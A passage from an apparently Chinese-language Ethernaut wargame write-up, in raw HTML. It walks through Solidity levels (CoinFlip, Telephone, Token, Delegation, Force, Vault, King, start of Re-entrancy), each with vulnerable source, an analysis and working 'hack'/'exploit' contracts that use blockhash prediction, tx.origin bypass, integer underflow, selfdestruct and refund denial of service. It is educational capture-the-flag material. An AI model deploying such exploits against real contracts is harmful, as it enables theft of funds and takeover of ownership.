class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">CoinFlip</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    consecutiveWins = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">flip</span>(<span class="params">bool _guess</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number<span class="number">-1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">    bool side = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      consecutiveWins = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract hack&#123;</span><br><span class="line">  uint256 FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line">  </span><br><span class="line">  address instance_address = <span class="number">0x3205e72483e9568c0959384f9c13672c3566c4a1</span>;</span><br><span class="line">  CoinFlip c = CoinFlip(instance_address);</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number<span class="number">-1</span>));</span><br><span class="line">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">    bool side = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    c.flip(side);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>调用 <code>10</code> 次 <span id="inline-blue">exploit()</span> 即可<br><br></li>
</ul>
<h1 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h1><h2 id="Require-3"><a href="#Require-3" class="headerlink" title="Require"></a>Require</h2><ul>
<li><code>Claim ownship of the contract below to complete this level</code></li>
</ul>
<h2 id="Source-3"><a href="#Source-3" class="headerlink" title="Source"></a>Source</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Telephone</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">changeOwner</span>(<span class="params">address _owner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analyse-3"><a href="#Analyse-3" class="headerlink" title="Analyse"></a>Analyse</h2><ul>
<li>这里区分一下 <code>tx.origin</code> 和 <code>msg.sender</code> ，<code>msg.sender</code>是函数的直接调用方，在用户手动调用该函数时是发起交易的账户地址，但也可以是调用该函数的一个智能合约的地址。而 <code>tx.origin</code> 则必然是这个交易的原始发起方，无论中间有多少次合约内/跨合约函数调用，而且一定是账户地址而不是合约地址。</li>
<li>给定这样一个场景如：用户通过 <span id="inline-blue">合约A</span> 调 <span id="inline-purple">合约B</span> ，此时：<ul>
<li>对于 <span id="inline-blue">合约A</span> ：<code>tx.origin</code>和<code>msg.sender</code>都是用户</li>
<li>对于 <span id="inline-purple">合约B</span> ：<code>tx.origin</code>是用户，<code>msg.sender</code>是 <span id="inline-blue">合约A</span><br>所以，这里部署一个第三方合约即可。</li>
</ul>
</li>
</ul>
<h2 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Telephone</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">changeOwner</span>(<span class="params">address _owner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract hack &#123;</span><br><span class="line">    address instance_address = <span class="number">0x852cd04ec66730198e709eb4261d3fa926bc92d8</span>;</span><br><span class="line">    Telephone t = Telephone(instance_address);</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        t.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>攻击者调用 <code>exploit()</code> 即可<br><br></li>
</ul>
<h1 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h1><h2 id="Require-4"><a href="#Require-4" class="headerlink" title="Require"></a>Require</h2><ul>
<li><code>The goal of this level is for you to hack the basic token contract below.</code></li>
<li><code>You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.</code></li>
</ul>
<h2 id="Source-4"><a href="#Source-4" class="headerlink" title="Source"></a>Source</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Token</span>(<span class="params">uint _initialSupply</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint _value</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(balances[msg.sender] - _value &gt;= <span class="number">0</span>);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _owner</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint balance</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analyse-4"><a href="#Analyse-4" class="headerlink" title="Analyse"></a>Analyse</h2><ul>
<li>经典的整数溢出问题，在 <code>transfer()</code> 函数第一行 <code>require</code> 里，这里的 <code>balances</code> 和 <code>value</code> 都是 <code>uint</code> 。此时 <code>balances</code> 为 <code>20</code> ，令 <code>value=21</code> ，产生下溢，从而绕过验证，并转出一笔很大的金额。</li>
</ul>
<h3 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 转给谁不重要，关键是利用 20-21 触发整数下溢</span></span><br><span class="line"><span class="keyword">await</span> contract.transfer(<span class="number">0</span>, <span class="number">21</span>);</span><br><span class="line"><span class="comment">// 可以看一下自己现在的 token 有多少（非常之多）</span></span><br><span class="line"><span class="keyword">await</span> contract.balanceOf(player);</span><br></pre></td></tr></table></figure>
<ul>
<li>但是也并非没有办法来处理该问题，最简单的处理是在每一次数学运算时进行判断，如 <code>a=a+b</code> ；就可以写成 <code>if(a+b&gt;a) a=a+b;</code> 。题目建议的另一种解决方案则是使用 <span id="inline-yellow">OpenZeppelin团队</span> 开发的 <span id="inline-pruple">SafeMath库</span> ，如果整数溢出漏洞发生时，函数将进行回退操作，此时加法操作可以写作这样：<code>a=a.add(b);</code><br><br></li>
</ul>
<h1 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h1><h2 id="Require-5"><a href="#Require-5" class="headerlink" title="Require"></a>Require</h2><ul>
<li><code>claim ownership of the instance</code></li>
</ul>
<h2 id="Source-5"><a href="#Source-5" class="headerlink" title="Source"></a>Source</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Delegate</span>(<span class="params">address _owner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Delegation</span>(<span class="params">address _delegateAddress</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(delegate.delegatecall(msg.data)) &#123;</span><br><span class="line">      <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analyse-5"><a href="#Analyse-5" class="headerlink" title="Analyse"></a>Analyse</h2><ul>
<li>我们看下 <code>delegatecall</code> 的文档</li>
</ul>
<p id="div-border-top-blue">There exists a special variant of a message call, named delegatecall which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and msg.sender and msg.value do not change their values.</p>

<h3 id="考点一"><a href="#考点一" class="headerlink" title="考点一"></a>考点一</h3><ul>
<li>考点一在于 <code>Solidity</code> 支持两种底层调用方式 <span id="inline-blue">call</span> 和 <span id="inline-purple">delegatecall</span></li>
<li><span id="inline-blue">call</span> 外部调用时，上下文是外部合约</li>
<li><span id="inline-purple">delegatecall</span> 外部调用时，上下文是调用合约<br><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/4.png" alt></li>
<li>所以 <code>delegate.delegatecall(msg.data)</code> 其实调用的是 <code>delegate</code> 自身的 <code>msg.data</code></li>
</ul>
<h3 id="考点二"><a href="#考点二" class="headerlink" title="考点二"></a>考点二</h3><ul>
<li>熟悉 <code>raw</code> 格式的交易的 <code>data</code> 的会知道：<code>data</code> 头<code>4</code>个 <code>byte</code> 是被调用方法的签名哈希，即 <code>bytes4(keccak256(&quot;func&quot;))</code> , <code>remix</code> 里调用函数，实际是向合约账户地址发送了( <code>msg.data[0:4]</code> == 函数签名哈希 )的一笔交易</li>
<li>所以我们只需调用 <code>Delegation</code> 的 <code>fallback</code> 的同时在 <code>msg.data</code> 放入 <code>pwn</code> 函数的签名即可</li>
</ul>
<h3 id="考点三"><a href="#考点三" class="headerlink" title="考点三"></a>考点三</h3><ul>
<li>这里其实主要思路就是 <code>fallback</code> 的触发条件：<ul>
<li>一是如果合约在被调用的时候，找不到对方调用的函数，就会自动调用 <code>fallback</code> 函数</li>
<li>二是只要是合约收到别人发送的 <code>Ether</code> 且没有数据，就会尝试执行 <code>fallback</code> 函数，此时 <code>fallback</code> 需要带有 <code>payable</code> 标记，否则，合约就会拒绝这个 <code>Ether</code></li>
</ul>
</li>
</ul>
<p id="div-border-left-blue">综上，我们只需调用 <code>Delegation</code> 的 <code>假pwn()</code> 即可，这样就会触发 <code>Delegation</code> 的 <code>fallback</code> ，这样 <code>pwn</code> 的函数签名哈希就会放在 <code>msg.data[0:4]</code> 了，这样就会只需 <code>delegate</code> 的 <code>pwn()</code> 把 <code>owner</code> 变成自己</p>

<h2 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution"></a>Solution</h2><ul>
<li><code>web3</code> 中 <code>sha3</code> 就是 <code>keccak256</code><br><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/6.png" alt><br><br></li>
</ul>
<h1 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h1><h2 id="Require-6"><a href="#Require-6" class="headerlink" title="Require"></a>Require</h2><ul>
<li><code>make the balance of the contract greater than zero</code></li>
</ul>
<h2 id="Source-6"><a href="#Source-6" class="headerlink" title="Source"></a>Source</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Force &#123;<span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                   MEOW ?</span></span><br><span class="line"><span class="comment">         /\_/\   /</span></span><br><span class="line"><span class="comment">    ____/ o o \</span></span><br><span class="line"><span class="comment">  /~____  =ø= /</span></span><br><span class="line"><span class="comment"> (______)__m_m)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span>&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analyse-6"><a href="#Analyse-6" class="headerlink" title="Analyse"></a>Analyse</h2><ul>
<li>骚操作， <code>selfdestruct</code> 自毁合约强转</li>
<li>所以只需要再部署一个合约，打一点钱，然后自毁把合约金额转给目标合约即可</li>
</ul>
<h2 id="Solution-6"><a href="#Solution-6" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"> </span><br><span class="line">contract Force &#123;&#125;</span><br><span class="line"></span><br><span class="line">contract hack &#123;</span><br><span class="line">    address instance_address = <span class="number">0xe0a165650f7b04bde4fda5845d41aaf947703dd2</span>;</span><br><span class="line">    Force target = Force(instance_address);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hack</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>) <span class="title">payable</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">        selfdestruct(target);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>部署 <code>hack</code> 的时候转一点钱，然后执行 <code>exploit()</code> 即可<br><br></li>
</ul>
<h1 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h1><h2 id="Require-7"><a href="#Require-7" class="headerlink" title="Require"></a>Require</h2><ul>
<li><code>Unlock the vault to pass the level!</code></li>
</ul>
<h2 id="Source-7"><a href="#Source-7" class="headerlink" title="Source"></a>Source</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Vault</span>(<span class="params">bytes32 _password</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    locked = <span class="literal">true</span>;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">unlock</span>(<span class="params">bytes32 _password</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (password == _password) &#123;</span><br><span class="line">      locked = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analyse-7"><a href="#Analyse-7" class="headerlink" title="Analyse"></a>Analyse</h2><ul>
<li>通关条件是 <code>locked = false</code></li>
<li>考点关键是区块链上的所有信息是公开的</li>
<li>可以用 <code>web3</code> 的 <code>getStorageAt</code> 来访问合约里变量的值</li>
</ul>
<h2 id="Solution-7"><a href="#Solution-7" class="headerlink" title="Solution"></a>Solution</h2><p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/7.png" alt><br><br></p>
<h1 id="King"><a href="#King" class="headerlink" title="King"></a>King</h1><h2 id="Require-8"><a href="#Require-8" class="headerlink" title="Require"></a>Require</h2><ul>
<li><code>When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.</code></li>
</ul>
<h2 id="Source-8"><a href="#Source-8" class="headerlink" title="Source"></a>Source</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'zeppelin-solidity/contracts/ownership/Ownable.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract King is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  address public king;</span><br><span class="line">  uint public prize;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">King</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analyse-8"><a href="#Analyse-8" class="headerlink" title="Analyse"></a>Analyse</h2><ul>
<li>代码逻辑很简单，谁给的钱多谁就能成为 <span id="inline-yellow">King</span> ，并且将前任 <span id="inline-yellow">King</span> 的钱归还。当提交 <code>instance</code> 时，题目会重新夺回 <span id="inline-yellow">King</span> 的位置，需要阻止其他人成为 <span id="inline-yellow">King</span>方可通关</li>
<li>首先看一下 <code>Solidity</code> 中几种转账方式：<ul>
<li><span id="inline-blue">address.transfer()</span><br>当发送失败时会 <code>throw</code> ；回滚状态<br>只会传递部分 <code>Gas</code> 供调用，防止重入</li>
<li><span id="inline-purple">address.send()</span><br>当发送失败时会返回 <code>false</code><br>只会传递部分 <code>Gas</code> 供调用，防止重入</li>
<li><span id="inline-green">address.call.value()()</span><br>当发送失败时会返回 <code>false</code><br>传递所有可用 <code>Gas</code> 供调用，不能有效防止重入</li>
</ul>
</li>
<li>回头看下代码，当我们成为 <span id="inline-yellow">King</span> 后，如果有人出价比我们高，会首先把钱退回给我们，使用的是 <span id="inline-blue">transfer</span> ，上面提到当 <span id="inline-blue">transfer</span> 调用失败时会回滚状态，那么如果合约在退钱这一步骤一直调用失败的话，那么代码将无法继续向下运行，其他人也就无法成为新的 <span id="inline-yellow">King</span>，达到攻击效果</li>
</ul>
<h2 id="Solution-8"><a href="#Solution-8" class="headerlink" title="Solution"></a>Solution</h2><ul>
<li>首先查看一下当前最高出价</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> fromWei((<span class="keyword">await</span> contract.prize()).toNumber())</span><br><span class="line"><span class="comment">// 1 eth</span></span><br></pre></td></tr></table></figure>
<ul>
<li>部署一个新的合约，当收到转账时主动抛出错误</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address instance_address = <span class="number">0xa4d38a8591b7e16bea4fe0f64cd77ee7243f1cdc</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Attack</span>(<span class="params"></span>) <span class="title">payable</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hack</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        instance_address.call.value(<span class="number">1.1</span> ether)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>调用 <code>hack()</code> 即可，可以看到调用 <code>hack()</code> 后成为了新的 <span id="inline-yellow">King</span> ，而且 <code>Submit innstance</code> 后，仍然是 <span id="inline-yellow">King</span></li>
</ul>
<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/8.png" alt></p>
<p><br></p>
<h1 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h1><h2 id="Require-9"><a href="#Require-9" class="headerlink" title="Require"></a>Require</h2><ul>
<li><code>The goal of this level is for you to steal all the funds from the contract</code></li>
</ul>
<h2 id="Source-9"><a href="#Source-9" class="headerlink" title="Source"></a>Source</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'openzeppelin-solidity/contracts/math/SafeMath.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">donate</span>(<span class="params">address _to</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _who</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint balance</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint _amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      <span class="keyword">if</span>(msg.sender.call.value(_amount)()) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;&#125;</span><br><span 